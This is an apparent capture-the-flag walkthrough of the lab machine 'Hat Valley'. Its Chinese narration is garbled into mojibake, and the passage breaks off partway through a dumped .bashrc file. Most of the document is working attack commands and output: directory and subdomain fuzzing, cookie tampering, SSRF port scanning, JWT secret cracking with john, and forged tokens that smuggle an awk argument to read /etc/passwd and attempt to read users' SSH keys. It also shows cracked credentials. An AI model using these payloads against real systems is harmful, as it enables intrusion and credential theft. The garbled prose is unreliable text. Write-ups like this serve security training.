OS:SCAN(V=7.93%E=4%D=3/11%OT=22%CT=1%CU=37953%PV=Y%DS=2%DC=T%G=Y%TM=640B6F2 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1 OS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 74.06 ms 10.10.16.1 2 75.37 ms 10.10.11.185 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.82 seconds Httpè¿™è¾¹ web é¡µé¢æŒ‡å‘åŸŸå hat-valley.htb ï¼Œå»åšä¸€ä¸ª hosts è§£æ echo 10.10.11.185 hat-valley.htb &gt;&gt; /etc/hosts ä¼¼ä¹æ˜¯ä¸€ä¸ªä»€ä¹ˆå•†åŸä¹‹ç±»çš„ï¼Œåšæ‰¾ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ç”¨ä¿¡æ¯ Fuzzâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://hat-valley.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ css [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 404ms] static [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 386ms] js [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 356ms] [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 98ms] :: Progress: [30000/30000] :: Job [1/1] :: 743 req/sec :: Duration: [0:00:54] :: Errors: 2 :: è·‘äº†ä¸€ä¸‹ç›®å½•ï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå»è·‘ä¸€ä¸‹å­åŸŸå â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ffuf -H &quot;Host:FUZZ.hat-valley.htb&quot; -w &quot;/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt&quot; -u &quot;http://hat-valley.htb/&quot; -t 200 -fs 132 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.hat-valley.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 132 ________________________________________________ store [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 76ms] :: Progress: [114441/114441] :: Job [1/1] :: 2296 req/sec :: Duration: [0:00:49] :: Errors: 0 :: å‘ç°ä¸€ä¸ªå­åŸŸå store ï¼Œå»åŠ å…¥ä¸€ä¸‹ hosts è§£æ echo 10.10.11.185 store.hat-valley.htb &gt;&gt; /etc/hosts ç„¶åå»è®¿é—®ä¸€ä¸‹ æç¤ºéœ€è¦ç™»å½•ï¼Œå°è¯•äº†ä¸€ä¸‹å¼±å£ä»¤æ²¡æœ‰æˆåŠŸï¼Œå¹¶ä¸” fuzz äº†ä¸€ä¸‹ä¹Ÿæ²¡æœ‰å¯ä»¥è®¿é—®çš„åœ°å€ï¼Œéƒ½æ˜¯ 401 æŠŠç›®å…‰æ”¾å›åˆ°ä¸»é¡µé¢ï¼Œæˆ‘ä»¬ç»§ç»­ fuzz ä¸‹å» â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://hat-valley.htb/js/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -e .js /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb/js/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Extensions : .js :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 200 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ app [Status: 200, Size: 150, Words: 6, Lines: 1, Duration: 267ms] app.js [Status: 200, Size: 430202, Words: 15339, Lines: 1640, Duration: 175ms] custom.js [Status: 200, Size: 8618, Words: 865, Lines: 370, Duration: 135ms] custom [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 230ms] plugin [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 240ms] plugin.js [Status: 200, Size: 899759, Words: 60565, Lines: 18950, Duration: 135ms] [Status: 200, Size: 14351, Words: 1661, Lines: 366, Duration: 575ms] revolution [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 286ms] :: Progress: [60000/60000] :: Job [1/1] :: 564 req/sec :: Duration: [0:01:46] :: Errors: 4 :: åœ¨ app.js ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªæŒ‡å‘ hr çš„åœ°å€ï¼Œå»è®¿é—®ä¸€ä¸‹ æœ‰ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œä½†æµ‹è¯•äº†ä¸€ä¸‹å¼±å£ä»¤æ²¡æˆåŠŸ æ¼æ´åˆ©ç”¨å¯»æ‰¾çªç ´ç‚¹ æŸ¥çœ‹ Cookie ä¸­ï¼Œå‘ç°æœ‰ä¸€ä¸ª token å€¼æ˜¯ guestï¼Œç»™å®ƒæ”¹æˆ admin è¯•è¯• å°±ç›´æ¥ç™»å½•äº† è¿™é‡Œæœ‰ä¸ªè¯·å‡ç”³è¯·ï¼Œä½†æ˜¯ç‚¹äº†æ²¡æœ‰ååº”ï¼ŸæŠ“ä¸ªåŒ…çœ‹çœ‹ ç›´æ¥ 500 äº† åœ¨è¿™é‡Œå‘ç°äº†ä¸¤ä¸ªæ¥å£ api/store-status api/staff-details åˆ†åˆ«å»è®¿é—®ä¸€ä¸‹å‘¢ ä¼¼ä¹æ˜¯ JWT ä»¤ç‰Œçš„é—®é¢˜ï¼Œè€Œ JWT ä»¤ç‰Œæ˜¯å¿…é¡»ç™»å½•åæ‰æœ‰çš„ï¼Œä½†æˆ‘ä»¬ç°åœ¨æ˜¯é€šè¿‡æœªæˆæƒè®¿é—®ï¼ˆè¿˜æ˜¯è¶Šæƒï¼Ÿï¼‰æ¥è¿›è¡Œç™»å½•çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ JWT ä»¤ç‰Œã€‚ æ‰€ä»¥æˆ‘ä»¬ç°åœ¨å»é€€å‡ºç™»å½•å†è®¿é—®è¿™ä¸ªé¡µé¢è¯•è¯•çœ‹ æˆ‘å‘ç°æˆ‘çš„æ€è·¯é”™äº†ï¼Œé€€å‡ºç™»å½•åè¿˜æ˜¯å›æœ‰ä¸€ä¸ª cookieï¼Œæ‰€ä»¥ç›´æ¥åˆ é™¤ cookie è¯•è¯• æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å¾—åˆ°äº†ä¸€äº›è´¦å·å¯†ç  ä½¿ç”¨ crack station æ¥è¿›è¡Œç ´è§£ https://crackstation.net/ å¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç  username = christopher.jones password = chris123 ç„¶åæˆ‘ä»¬å» hr é¡µé¢ç™»å½• ç™»å½•æˆåŠŸ ç„¶åæˆ‘ä»¬æ‹¿åˆ°äº† JWT Token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8 ä½¿ç”¨ jwt.io è®¿é—®ï¼Œå¯ä»¥çœ‹åˆ°å†…å®¹ç›¸å½“çš„ç®€å• ä½†æ˜¯æˆ‘åœ¨å››ä¸ªç”¨æˆ·åˆ—è¡¨ä¸­æ²¡æœ‰çœ‹åˆ°ä»€ä¹ˆæ˜æ˜¾çš„æ˜¯ç®¡ç†å‘˜çš„ä¸œè¥¿ ä¸è¿‡ Christine Wool ä¼¼ä¹æ˜¯ CEOï¼Œä½†æ˜¯ JWT ä»¤ç‰Œä¼ªé€ æ¯”è¾ƒéº»çƒ¦ï¼Œè€Œä¸”æˆ‘çœ‹äº†ä¸‹é¶åœºç±»å‹ï¼Œåå‘äº Custom Exploitation ï¼Œè¿™çœ‹ç€å¾ˆåƒæ˜¯å…”å­æ´ æ‰€ä»¥æˆ‘ä»¬æ¢ä¸ªæ€è·¯ æ¥åˆ°é¦–é¡µï¼Œæˆ‘ä»¬ç‚¹å‡»åˆ·æ–°ï¼ŒæŠ“è¿™ä¸ªåˆ·æ–°çš„åŒ…çœ‹çœ‹ è¯·æ±‚çš„åŒ…æœ‰ç‚¹å¥‡æ€ª è¿™ä¸ªåŒ…æŒ‡å‘äº†å­åŸŸå store okï¼Œè¿™å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ª SSRF äº†ï¼Œæˆ‘ä»¬æ¥ fuzz ä¸€ä¸‹ Fuzzâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ffuf -u &#39;http://hat-valley.htb/api/store-status?url=&quot;http://localhost:FUZZ&quot;&#39; -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -fs 0 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://hat-valley.htb/api/store-status?url=&quot;http://localhost:FUZZ&quot; :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 0 ________________________________________________ 0080 [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 290ms] 3002 [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 142ms] 8080 [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 170ms] :: Progress: [10000/10000] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:49] :: Errors: 0 :: è¿™é‡Œçš„ 3002 å’Œ 8080 éƒ½æ˜¯æˆ‘ä»¬æ²¡æœ‰è§è¿‡çš„ï¼Œæ¯”è¾ƒå¥‡æ€ªçš„ï¼Œå¹¶ä¸”æœ‰ä¸œè¥¿çš„ è€Œ 3002 çš„ size å±…ç„¶æœ‰ 77010 ä¸ªï¼Œæ˜æ˜¾ä¸å¯¹ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹ ç›´æ¥è®¿é—®æ˜¯ç©ºç™½çš„ï¼Œæˆ‘ä»¬åŠ ä¸ŠåŒå¼•å·è¯•è¯• niceï¼Œæœ‰ä¸œè¥¿äº† å‘ç°ä¸ªæœ‰è¶£çš„ç©æ„å„¿ï¼Œæ£€ç´¢å·²ç™»å½•ç”¨æˆ·çš„ä¼‘å‡è¯·æ±‚å†å²è®°å½•ï¼Œè¿™ä¸ªæ¥å£æ˜¯æœ‰ LFI çš„ã€‚ JWT Token åˆ©ç”¨è¿™é‡Œçš„ awk å‘½ä»¤æ˜¯ä¼ é€’ç”¨æˆ·å˜é‡çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶å®ƒæ¥è¾¾åˆ°åˆ©ç”¨çš„ç›®çš„ æˆ‘ä»¬éœ€è¦å°†ç”¨æˆ·å˜é‡æ›´æ”¹ä¸º /etc/passwd user å˜é‡çš„å€¼æ˜¯ JWT ä»¤ç‰Œçš„ç”¨æˆ·åï¼Œä¸ºäº†è®©å®ƒæˆåŠŸåˆ©ç”¨ï¼Œæˆ‘ä»¬å…ˆå»æ‹¿åˆ° JWT Token çš„å¯†é’¥ é¦–å…ˆå°† token ä¿å­˜åˆ°æœ¬åœ° â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# cat jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8 ç„¶åä½¿ç”¨ john è¿›è¡Œç ´è§£ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# john jwt --wordlist=/usr/share/wordlists/rockyou.txt -format=HMAC-SHA256 Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 AVX 4x]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 123beany123 (?) 1g 0:00:00:03 DONE (2023-03-12 00:54) 0.3076g/s 4102Kp/s 4102Kc/s 4102KC/s 123erix..123P45 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. å¾—åˆ°äº†å¯†é’¥ ç„¶åæˆ‘ä»¬å» jwt.io è¿›è¡Œ cookie çš„ä¼ªé€  å¾—åˆ°äº† cookie eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk ç„¶åæˆ‘ä»¬ç”¨ burp æŠ“åŒ…ä¸€ä¸ªè®¿é—® &#x2F;api&#x2F;all-leave çš„è¯·æ±‚ï¼Œç„¶åæŠŠ cookie æ›¿æ¢ä¸ºæˆ‘ä»¬åˆ¶ä½œçš„ æˆåŠŸåˆ©ç”¨ æˆ‘è¿™ä¸ªäººæ¯”è¾ƒæ‡’ï¼Œæ‰€ä»¥ç°åœ¨æˆ‘ä»¬æ¥æ„é€ ä¸€ä¸‹å‘½ä»¤è¡Œçš„ curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk&quot; â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk&quot; root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:102:105::/nonexistent:/usr/sbin/nologin systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin syslog:x:104:111::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin whoopsie:x:117:124::/nonexistent:/bin/false sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin saned:x:121:128::/var/lib/saned:/usr/sbin/nologin colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false bean:x:1001:1001:,,,:/home/bean:/bin/bash christine:x:1002:1002:,,,:/home/christine:/bin/bash postfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false sshd:x:130:65534::/run/sshd:/usr/sbin/nologin _laurel:x:999:999::/var/log/laurel:/bin/false åˆ©ç”¨æˆåŠŸï¼Œç°åœ¨æˆ‘ä»¬æ¥ç­›é€‰ä¸€ä¸‹å“ªäº›ç”¨æˆ·å¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzg1NTE0NTd9.4WKtKGFVSVXt2mD7ZJyxyclmMKFe-lHklgj4QVzBtZk&quot;|grep bash % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3059 100 3059 0 0 11835 0 --:--:-- --:--:-- --:--:-- 11856 root:x:0:0:root:/root:/bin/bash bean:x:1001:1001:,,,:/home/bean:/bin/bash christine:x:1002:1002:,,,:/home/christine:/bin/bash å¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨çš„æœ‰ä¸‰ä¸ªï¼Œrootã€beanã€christineï¼Œå¾ˆæ˜æ˜¾ root å¯ä»¥æ’é™¤æ‰ï¼Œé‚£æˆ‘ä»¬æ¥å°è¯•è¯·æ±‚ä¸€ä¸‹å‰©ä¸‹ä¸¤ä¸ªçš„ ssh å¯†é’¥è¯•è¯• eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A å»å°è¯•ä¸€ä¸‹ curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs&quot; curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A&quot; â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLnNzaC9pZF9yc2EgJyIsImlhdCI6MTY3ODU1MTQ1N30.q-l1lOtEZN_v9o2iSq6QtSAa_qy4q820aemxYDMfcKs&quot; Failed to retrieve leave requests â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2NocmlzdGluZS8uc3NoL2lkX3JzYSAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.MUsm1gjZCMxGU1lJ6D0NRn8X_NAaVF2Mf1oZj0het5A&quot; Failed to retrieve leave requests éƒ½å¤±è´¥äº†ï¼Œé‚£æˆ‘ä»¬å»è·å–ä¸€ä¸‹ .bashrc æ–‡ä»¶è¯•è¯• eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg&quot; â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://hat-valley.htb/api/all-leave --header &quot;cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc4NTUxNDU3fQ.qM7H1rC2FK75T8PtsA0FfWpP47D5EIoESKpVnx4e-fg&quot; # ~/.bashrc: executed by bash(1) for non-login shells. # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) # for examples # If not running interactively, don&#39;t do anything case $- in *i*) ;; *) return;; esac # don&#39;t put duplicate lines or lines starting with space in the history. # See bash(1) for more options HISTCONTROL=ignoreboth # append to the history file, don&#39;t overwrite it shopt -s histappend # for setting history length see HISTSIZE and HISTFILESIZE in bash(1) HISTSIZE=1000 HISTFILESIZE=2000 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # If set, the pattern &quot;**&quot; used in a pathname expansion context will # match all files and zero or more directories and subdirectories. #shopt -s globstar # make less more friendly for non-text input files, see lesspipe(1) [ -x /usr/bin/lesspipe ] &amp;&amp; eval &quot;$(SHELL=/bin/sh lesspipe)&quot; # set variable identifying the chroot you work in (used in the prompt below) if [ -z &quot;${debian_chroot:-}&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot) fi # set a fancy prompt (non-color, unless we know we &quot;want&quot; color) case &quot;$TERM&quot; in xterm-color|*-256color) color_prompt=yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt #force_color_prompt=yes if [ -n &quot;$force_color_prompt&quot; ]; then if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then # We have color support; assume it&#39;s compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt=yes else color_prompt= fi fi if [ &quot;$color_prompt&quot; = yes ]; then PS1=&#39;${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ &#39; else PS1=&#39;${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ &#39; fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case &quot;$TERM&quot; in xterm*|rxvt*) PS1=&quot;\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1&quot; ;; *) ;; esac # enable color support of ls and also add handy aliases if [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot; alias ls=&#39;ls --color=auto&#39; #alias dir=&#39;dir --color=auto&#39; #alias vdir=&#39;vdir --color=auto&#39; alias grep=&#39;grep --color=auto&#39; alias fgrep=&#39;fgrep --color=auto&#39; alias egrep=&#39;egrep --color=auto&#39; fi # colored GCC warnings and errors #export GCC_COLORS=&#39;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#39; # some more ls aliases alias ll=&#39;ls -alF&#39; alias la=&#39;ls -A&#39; alias l=&#39;ls -CF&#39; # custom alias backup_home=&#39;/bin/bash /home/bean/Documents/backup_home.sh&#39; # Add an &quot;alert&quot; alias for long running commands. Use like so: # sleep 10; alert alias alert=&#39;notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e &#39;\\&#39;&#39;s/^\\s*[0-9]\\+\\s*//;s/[;&amp;|]\\s*alert$//&#39;\\&#39;&#39;)&quot;&#39; # Alias definitions. # You may want to put all your additions into a separate file like # ~/.bash_aliases, instead of adding them here directly. # See /usr/share/doc/bash-doc/examples in the bash-doc package. if [ -f 